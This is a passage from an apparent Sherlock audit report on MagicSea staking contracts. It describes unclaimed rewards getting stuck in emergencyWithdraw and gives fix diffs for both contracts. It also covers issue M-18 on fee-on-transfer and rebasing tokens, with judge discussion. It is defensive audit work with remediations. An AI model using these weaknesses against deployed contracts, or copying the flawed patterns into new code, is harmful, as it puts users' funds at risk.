Users can call `MasterChef#emergencyWithdraw`, `MlumStaking#emergencyWithdraw` to withdraw tokens without claiming the rewards.

But the unclaimed rewards are not redistributed in `emergencyWithdraw` call, which will left the rewards stuck in the contracts and lost forever. Other users can not claim the rewards and the protocol can not redistribute the rewards.

## Impact

Unclaimed rewards when emergency withdrawing  in `MasterChef` and `MlumStaking` will stuck in the contracts and lost forever.

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MasterchefV2.sol#L326

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L536

## Tool used

Manual Review

## Recommendation

Redistribute the unclaimed rewards in `emergencyWithdraw`

`MasterchefV2.sol`

```diff
    function emergencyWithdraw(uint256 pid) external override {
        Farm storage farm = _farms[pid];

        uint256 balance = farm.amounts.getAmountOf(msg.sender);
        int256 deltaAmount = -balance.toInt256();

-       farm.amounts.update(msg.sender, deltaAmount);

+       (uint256 oldBalance, uint256 newBalance, uint256 oldTotalSupply,) = farm.amounts.update(msg.sender, deltaAmount);

+       uint256 totalLumRewardForPid = _getRewardForPid(farm.rewarder, pid, oldTotalSupply);
+       uint256 lumRewardForPid = _mintLum(totalLumRewardForPid);

+       uint256 lumReward = farm.rewarder.update(msg.sender, oldBalance, newBalance, oldTotalSupply, lumRewardForPid);
+       lumReward = lumReward + unclaimedRewards[pid][msg.sender];
+       unclaimedRewards[pid][msg.sender] = 0;

+       farm.rewarder.updateAccDebtPerShare(oldTotalSupply, lumReward);

        farm.token.safeTransfer(msg.sender, balance);

        emit PositionModified(pid, msg.sender, deltaAmount, 0);
    }
```

`MlumStaking.sol`

```diff
function emergencyWithdraw(uint256 tokenId) external override nonReentrant {
        _requireOnlyOwnerOf(tokenId);

        StakingPosition storage position = _stakingPositions[tokenId];

        // position should be unlocked
        require(
            _unlockOperators.contains(msg.sender)
                || (position.startLockTime + position.lockDuration) <= _currentBlockTimestamp() || isUnlocked(),
            "locked"
        );
        // emergencyWithdraw: locked

+       _updatePool();

+       uint256 pending = position.amountWithMultiplier * _accRewardsPerShare / PRECISION_FACTOR - position.rewardDebt;

+       _lastRewardBalance = _lastRewardBalance - pending;

        uint256 amount = position.amount;

        // update total lp supply
        _stakedSupply = _stakedSupply - amount;
        _stakedSupplyWithMultiplier = _stakedSupplyWithMultiplier - position.amountWithMultiplier;

        // destroy position (ignore boost points)
        _destroyPosition(tokenId);

        emit EmergencyWithdraw(tokenId, amount);
        stakedToken.safeTransfer(msg.sender, amount);
    }

```








## Discussion

**0xSmartContract**

This report was chosen as the main report because it states the findings `MasterChef#emergencyWithdraw` and `MlumStaking#emergencyWithdraw` in a single report.




**0xSmartContract**

When emergency withdrawing are made, Unclaimed rewards in `MasterChef` and `MlumStaking` contracts remain stuck in the contracts and are lost forever

# Issue M-18: Lack of support for fee on transfer, rebasing and tokens with balance modifications outside of transfers. 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/545 

## Found by 
0uts1der, 0xAnmol, 0xNilesh, 0xWhitehat, 4rdiii, AuditorPraise, Bauchibred, ChinmayF, Ericselvig, Honour, Hunter, John\_Femi, KiroBrejka, KupiaSec, LeFy, MSaptarshi, NoOne, PASCAL, PUSH0, Reentrants, Ryonen, Silvermist, Smacaud, StraawHaat, TessKimy, Tri-pathi, Vancelot, WildSniper, ZanyBonzy, bbl4de, blockchain555, dany.armstrong90, dhank, dimulski, dod4ufn, gajiknownnothing, hunter\_w3b, iamnmt, jennifer37, karsar, kmXAdam, minhquanym, neogranicen, novaman33, pinalikefruit, radin200, rbserver, scammed, sh0velware, sheep, slowfi, tedox, typicalHuman, walter, web3pwn, yixxas, zarkk01
## Summary

The protocol wants to work with various ERC20 tokens, but in certain cases doesn't provide the needed support for tokens that charge a fee on transfer, tokens that rebase (negatively/positively) and overall, tokens with balance modifications outside of transfers.

## Vulnerability Detail

The protocol wants to work with various ERC20 tokens, but still handles various transfers without querying the amount transferred and amount received, which can lead a host of accounting issues and the likes downstream.

For instance, In MasterchefV2.sol during withdrawals or particularly emergency withdrawals, the last user to withdraw all tokens will face issues as the amount registered to his name might be signifiacntly lesser than the token balance in the contract, which as a result will cause the withdrawal functions to fail. Or the protocol risks having to send extra funds from their pocket to coverup for these extra losses due to the fees. 
This is because on deposit, the amount entered is deposited as is, without accounting for potential fees.

```solidity
    function deposit(uint256 pid, uint256 amount) external override {
        _modify(pid, msg.sender, amount.toInt256(), false);

        if (amount > 0) _farms[pid].token.safeTransferFrom(msg.sender, address(this), amount);
    }
```
Some tokens like stETH have a [1 wei corner case ](https://docs.lido.fi/guides/lido-tokens-integration-guide/#1-2-wei-corner-case) in which during transfers the amount that actually gets sent is actually a bit less than what has been specified in the transaction. 

## Impact
On a QA severity level, tokens received by users will be less than emitted to them in the event.
On medium severity level, accounting issues, potential inability of last users to withdraw, potential loss of funds from tokens with airdrops, etc.
## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MasterchefV2.sol#L287

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MasterchefV2.sol#L298

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MasterchefV2.sol#L309

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MasterchefV2.sol#L334

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L559

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L649

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L744

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L747

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/rewarders/BribeRewarder.sol#L120

## Tool used
Manual Code Review

## Recommendation

Recommend implementing a measure like that of the `_transferSupportingFeeOnTransfer` function that can correctly handle these transfers. A sweep function can also be created to help with positive rebases and airdrops.



## Discussion

**0xSmartContract**

Upon thorough review of the findings categorized under the "Weird Token Issue" umbrella, it is evident that these issues root from the non-standard behaviors exhibited by certain ERC20 tokens. 

These tokens, referred to as "weird tokens," include fee-on-transfer tokens, rebasing tokens (both positive and negative), tokens with low or high decimals, and tokens with other non-standard characteristics.

   - The ERC20 standard is known for its flexibility and minimal semantic requirements. This flexibility, while useful, leads to diverse token implementations that deviate from the standard behaviors expected by smart contracts. The issues reported are a direct consequence of this looseness in the ERC20 specification.

   - Fee-on-transfer tokens deduct a portion of the transferred amount as a fee, leading to discrepancies between the expected and actual transferred amounts. This impacts functions like `deposit()`, `withdraw()`, and reward calculations.

   - Rebasing tokens adjust balances periodically, either increasing (positive rebase) or decreasing (negative rebase) token balances. This behavior causes issues with static balance tracking and can lead to inaccurate accounting and loss of funds.
   
   Detail of Issues List and Analysis 
   https://gist.github.com/0xSmartContract/4e7e9fc500f7d6e6061d94ffde6c2206
   
   
  Given  README explicitly allowing for weird tokens, it makes sense to group all related findings under the umbrella of "Weird ERC20 Tokens". 



### Here are the technical and practical reasons why this grouping is justified:


**According to Sherlock rules**, the ["Weird Token" List](https://github.com/d-xo/weird-erc20) is unique and all of these issues are in this single list and are not separated.

https://docs.sherlock.xyz/audits/judging/judging#vii.-list-of-issue-categories-that-are-not-considered-valid
>Non-Standard tokens: Issues related to tokens with non-standard behaviors, such as [weird-tokens]
>(https://github.com/d-xo/weird-erc20) are not considered valid by default unless these 
>tokens are explicitly mentioned in the README.



**Unified Theme and Clarity**:By categorizing these issues together, the report maintains a coherent theme, making it easier for auditers and Sponsor to understand the underlying problem of dealing with unconventional ERC20 tokens.

**Specification Looseness**: The ERC20 specification is known to be loosely defined, leading to diverse implementations. Many tokens deviate from standard behaviors, causing unexpected issues when integrated into smart contracts.

**Common Problems**: Issues like fee-on-transfer, rebasing (both positive and negative), low/high decimals, and missing return values are common among these tokens, causing similar types of problems across different functions and contracts.


Here are  key issues grouped under the "Weird ERC20 Tokens" category:

- `Fee on Transfer`: Tokens deduct a fee during transfers, leading to discrepancies between the expected and actual transferred amounts.

- `Rebase (Negative and Positive)`: Tokens adjust balances periodically, causing issues with static balance tracking in smart contracts.

- `Low/High Decimals`: Tokens with unusual decimal places lead to precision loss and overflow issues.

- `Missing/False Return Values`: Tokens that do not follow standard return values on transfers or approvals, causing unexpected failures.

- `Special Behaviors`: Tokens like cUSDCv3 that have unique handling for specific amounts, leading to manipulation opportunities.

